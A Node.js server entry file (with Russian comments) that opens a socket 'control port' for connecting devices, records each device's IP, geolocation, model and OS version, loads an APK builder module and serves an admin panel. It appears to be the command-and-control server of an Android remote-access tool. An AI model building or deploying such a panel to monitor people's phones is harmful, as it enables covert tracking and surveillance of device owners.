const express = require('express');
const helmet = require('helmet');  // Импортируем helmet
const IO = require('socket.io');
const geoip = require('geoip-lite');
const CONST = require('./includes/const');
const initializeDatabase = require('./includes/databaseGateway');
const logManager = require('./includes/logManager');
const clientManagerClass = require('./includes/clientManager');
const apkBuilder = require('./includes/apkBuilder');

const app = express();

async function startServer() {
  const db = await initializeDatabase();

  const clientManager = new clientManagerClass(db);

  global.CONST = CONST;
  global.db = db;
  global.logManager = logManager;
  global.app = app;
  global.clientManager = clientManager;
  global.apkBuilder = apkBuilder;

  // Используем helmet для повышения безопасности
  app.use(helmet());

  // spin up socket server
  let client_io = IO.listen(CONST.control_port);

  client_io.sockets.pingInterval = 29999;
  client_io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {};

    clientManager.clientConnect(socket, clientParams.id, {
      clientIP,
      clientGeo,
      device: {
        model: clientParams.model,
        manufacture: clientParams.manf,
        version: clientParams.release
      }
    });

    if (CONST.debug) {
      var onevent = socket.onevent;
      socket.onevent = function (packet) {
        var args = packet.data || [];
        onevent.call(this, packet);    // original call
        packet.data = ["*"].concat(args);
        onevent.call(this, packet);      // additional call to catch-all
      };

      socket.on("*", function (event, data) {
        console.log(event);
        console.log(data);
      });
    }

  });

  // get the admin interface online
  app.listen(CONST.web_port, (err) => {
    if (err) {
      console.error('Failed to start server:', err);
    } else {
      console.log(`Server running on port ${CONST.web_port}`);
    }
  });

  app.set('view engine', 'ejs');
  app.set('views', './assets/views');
  app.use(express.static(__dirname + '/assets/webpublic'));
  app.use(require('./includes/expressRoutes'));
}

startServer().catch(err => {
  console.error('Failed to start server:', err);
});

